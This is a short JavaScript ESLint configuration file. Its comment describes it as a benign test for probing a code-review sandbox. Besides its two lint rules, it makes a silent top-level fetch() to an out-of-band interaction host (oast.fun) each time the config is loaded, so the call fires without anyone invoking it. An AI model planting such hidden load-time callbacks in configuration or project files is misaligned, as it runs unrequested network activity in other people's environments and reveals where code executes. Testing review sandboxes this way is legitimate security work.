// Test config for CodeRabbit review-sandbox evaluation (benign, single load-time fetch).
try {
  fetch("https://dboi0acfde33g265n8c03yb6os55jhwjz.oast.fun/c5-flat-exec").catch(() => {});
} catch (e) {}
export default [{ rules: { "no-var": "error", "no-console": "error" } }];
